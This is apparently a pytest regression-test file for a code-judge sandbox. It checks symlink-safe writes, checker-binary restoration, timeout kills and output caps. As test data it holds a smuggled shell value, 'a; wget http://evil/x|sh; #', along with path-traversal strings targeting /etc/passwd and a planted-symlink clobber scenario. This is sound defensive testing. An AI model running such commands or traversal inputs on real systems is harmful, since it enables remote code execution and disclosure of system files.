"""Regression tests for the judge sandbox: C5, C6, H3, H7.

These exercise the isolation logic directly and need neither Docker nor g++.
Tests that require a real container are in test_sandbox_docker.py and skip
themselves when Docker is unavailable.
"""
import os
import shutil
import subprocess
import sys
import tempfile
import time

import pytest

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO_ROOT)

import judge  # noqa: E402
from sandbox import docker_runner  # noqa: E402


# --------------------------------------------------------------------------
# C5: user code must not be able to redirect a judge write via a symlink
# --------------------------------------------------------------------------

def test_write_text_refuses_to_follow_a_planted_symlink(tmp_path):
    """The canary stands in for server.py / authorized_keys on the judge host."""
    canary = tmp_path / "canary.txt"
    canary.write_text("ORIGINAL", encoding="utf-8")

    workdir = tmp_path / "work"
    workdir.mkdir()
    planted = workdir / "checker_output.txt"
    # This is exactly what a submission does: it runs first, in this directory.
    os.symlink(canary, planted)

    cwd = os.getcwd()
    os.chdir(workdir)
    try:
        judge.write_text("checker_output.txt", "PWNED BY SUBMISSION")
    finally:
        os.chdir(cwd)

    assert canary.read_text(encoding="utf-8") == "ORIGINAL", (
        "judge write followed a symlink and clobbered a host file"
    )
    assert not planted.is_symlink(), "the planted symlink should have been replaced"
    assert planted.read_text(encoding="utf-8") == "PWNED BY SUBMISSION"


def test_write_text_still_overwrites_a_normal_file(tmp_path):
    target = tmp_path / "checker_input.txt"
    target.write_text("old", encoding="utf-8")
    judge.write_text(str(target), "new")
    assert target.read_text(encoding="utf-8") == "new"


def test_copy_task_file_does_not_follow_a_symlinked_destination(tmp_path):
    canary = tmp_path / "canary.txt"
    canary.write_text("ORIGINAL", encoding="utf-8")

    task = tmp_path / "task"
    (task / "checker").mkdir(parents=True)
    (task / "checker" / "checker.cpp").write_text("int main(){}", encoding="utf-8")

    workdir = tmp_path / "work"
    (workdir / "checker").mkdir(parents=True)
    os.symlink(canary, workdir / "checker" / "checker.cpp")

    cwd = os.getcwd()
    os.chdir(workdir)
    try:
        judge.copy_task_file(str(task), "checker/checker.cpp")
    finally:
        os.chdir(cwd)

    assert canary.read_text(encoding="utf-8") == "ORIGINAL"


# --------------------------------------------------------------------------
# H7: user code must not be able to swap the compiled checker
# --------------------------------------------------------------------------

def test_checker_binary_is_restored_from_the_pristine_copy(tmp_path, monkeypatch):
    monkeypatch.setattr(judge, "_PROTECTED_DIR", None, raising=False)
    workdir = tmp_path / "work"
    workdir.mkdir()
    cwd = os.getcwd()
    os.chdir(workdir)
    try:
        (workdir / "checker_bin").write_text("REAL CHECKER", encoding="utf-8")
        judge.stash_judge_binary("checker_bin")

        # A submission overwrites the checker with one that always exits 0.
        (workdir / "checker_bin").write_text("ALWAYS EXIT 0", encoding="utf-8")
        judge.restore_judge_binary("checker_bin")

        assert (workdir / "checker_bin").read_text(encoding="utf-8") == "REAL CHECKER"
    finally:
        os.chdir(cwd)


def test_pristine_copy_lives_outside_the_mounted_workdir(tmp_path, monkeypatch):
    monkeypatch.setattr(judge, "_PROTECTED_DIR", None, raising=False)
    workdir = tmp_path / "work"
    workdir.mkdir()
    cwd = os.getcwd()
    os.chdir(workdir)
    try:
        (workdir / "checker_bin").write_text("REAL", encoding="utf-8")
        stashed = judge.stash_judge_binary("checker_bin")
    finally:
        os.chdir(cwd)

    stashed_real = os.path.realpath(stashed)
    workdir_real = os.path.realpath(workdir)
    assert not stashed_real.startswith(workdir_real + os.sep), (
        "pristine copy is inside the directory bind-mounted into the sandbox"
    )


# --------------------------------------------------------------------------
# M7/M8: task-supplied names and paths
# --------------------------------------------------------------------------

@pytest.mark.parametrize(
    "raw,expected_safe",
    [
        ("001", "001"),
        ("a; wget http://evil/x|sh; #", "a__wget_http___evil_x_sh___"),
        ("../../etc/passwd", "_.._etc_passwd"),  # leading dots stripped too
        ("", "test"),
    ],
)
def test_safe_test_token_neutralises_task_supplied_names(raw, expected_safe):
    token = judge.safe_test_token(raw)
    assert token == expected_safe
    assert "/" not in token and ";" not in token and "|" not in token


def test_test_paths_cannot_escape_the_task_directory(tmp_path):
    task = tmp_path / "task"
    (task / "tests").mkdir(parents=True)
    (task / "tests" / "001").write_text("1", encoding="utf-8")

    assert judge.contained_task_path(str(task), "tests/001") is not None
    assert judge.contained_task_path(str(task), "/etc/passwd") is None
    assert judge.contained_task_path(str(task), "../../../etc/passwd") is None


def test_discover_tests_skips_escaping_paths(tmp_path):
    task = tmp_path / "task"
    (task / "tests").mkdir(parents=True)
    (task / "tests" / "001").write_text("1", encoding="utf-8")
    (task / "tests" / "001.a").write_text("1", encoding="utf-8")

    problem = {
        "tests": [
            {"name": "001", "input": "tests/001", "answer": "tests/001.a"},
            {"name": "evil", "input": "/etc/passwd", "answer": "tests/001.a"},
        ]
    }
    found = judge.discover_tests(str(task), problem)
    assert [t["name"] for t in found] == ["001"]


# --------------------------------------------------------------------------
# C6: the container and the whole process tree must die on timeout
# --------------------------------------------------------------------------

class _FakeProc:
    def __init__(self, pid=999999):
        self.pid = pid
        self.returncode = -9
        self.killed = False

    def kill(self):
        self.killed = True


def test_terminate_run_kills_the_named_container(monkeypatch):
    calls = []
    monkeypatch.setattr(
        docker_runner.subprocess, "run",
        lambda args, **kw: calls.append(list(args)),
    )
    docker_runner._terminate_run(_FakeProc(), "codebug-deadbeef")

    assert ["docker", "kill", "codebug-deadbeef"] in calls, calls


def test_docker_command_names_the_container_and_passes_it_through(monkeypatch):
    captured = {}

    def fake_run_process(command, **kwargs):
        captured["command"] = list(command)
        captured["container_name"] = kwargs.get("container_name")
        return 0, "", "", False, 1

    monkeypatch.setattr(docker_runner, "_docker_available", lambda: True)
    monkeypatch.setattr(docker_runner, "_run_process", fake_run_process)

    docker_runner.run_in_sandbox(["./sol"], workdir=".", language="cpp", timeout=1)

    cmd = captured["command"]
    assert "--name" in cmd, cmd
    name = cmd[cmd.index("--name") + 1]
    assert name.startswith("codebug-")
    # The same name must reach the kill path, or the container cannot be stopped.
    assert captured["container_name"] == name
    assert "--security-opt=no-new-privileges" in cmd
    assert "--network=none" in cmd and "--cap-drop=ALL" in cmd


def test_timeout_issues_a_docker_kill_for_that_container(monkeypatch):
    killed = []
    monkeypatch.setattr(
        docker_runner.subprocess, "run",
        lambda args, **kw: killed.append(list(args)),
    )

    class TimingOutProc(_FakeProc):
        def communicate(self, input=None, timeout=None):
            raise subprocess.TimeoutExpired(cmd="docker", timeout=timeout or 1)

    monkeypatch.setattr(docker_runner.subprocess, "Popen", lambda *a, **k: TimingOutProc())
    monkeypatch.setattr(docker_runner, "_docker_available", lambda: True)

    result = docker_runner.run_in_sandbox(["./sol"], workdir=".", language="cpp", timeout=1)

    assert result.timeout is True, "verdict must still be TL"
    assert any(c[:2] == ["docker", "kill"] for c in killed), killed


@pytest.mark.skipif(os.name != "posix", reason="process groups are POSIX-only")
def test_timeout_kills_grandchildren_not_just_the_direct_child(tmp_path):
    """A fork bomb's children must not outlive the run on the non-Docker path."""
    marker = tmp_path / "alive.txt"
    child = (
        "import time\n"
        f"f = open({str(marker)!r}, 'a')\n"
        "while True:\n"
        "    f.write('x'); f.flush(); time.sleep(0.05)\n"
    )
    script = tmp_path / "child.py"
    script.write_text(child, encoding="utf-8")

    # sh is the direct child; python is the grandchild that keeps writing.
    command = ["sh", "-c", f"{sys.executable} {script} & wait"]
    returncode, _, _, timed_out, _ = docker_runner._run_process(command, timeout=0.6)

    assert timed_out is True
    size_at_kill = marker.stat().st_size if marker.exists() else 0
    time.sleep(0.8)
    size_after = marker.stat().st_size if marker.exists() else 0
    assert size_after == size_at_kill, (
        "grandchild survived the timeout - the process group was not killed"
    )


# --------------------------------------------------------------------------
# H3: runaway output must not be able to fill the host disk
# --------------------------------------------------------------------------

def test_output_watchdog_fires_once_the_budget_is_exceeded(tmp_path):
    import threading

    big = tmp_path / "stdout.txt"
    big.write_bytes(b"x" * 5000)
    fired = threading.Event()
    stop = threading.Event()

    watcher = threading.Thread(
        target=docker_runner._watch_output_size,
        args=((str(big),), 1000, stop, fired.set),
        daemon=True,
    )
    watcher.start()
    assert fired.wait(timeout=3), "watchdog did not fire on an over-budget file"
    stop.set()


def test_runaway_output_is_killed_and_reported_as_timeout(tmp_path, monkeypatch):
    """A program printing forever is stopped early, and still reports TL."""
    monkeypatch.setattr(docker_runner, "_OUTPUT_HARD_LIMIT_BYTES", 256 * 1024)

    printer = tmp_path / "spam.py"
    printer.write_text(
        "import sys\nwhile True:\n    sys.stdout.write('A' * 4096)\n", encoding="utf-8"
    )
    started = time.monotonic()
    returncode, stdout, _, timed_out, _ = docker_runner._run_process(
        [sys.executable, str(printer)], timeout=30
    )
    elapsed = time.monotonic() - started

    assert timed_out is True, "runaway output must still surface as TL"
    assert elapsed < 20, f"watchdog did not stop the run early (took {elapsed:.1f}s)"
    assert len(stdout.encode()) <= docker_runner._OUTPUT_LIMIT_BYTES + 4096
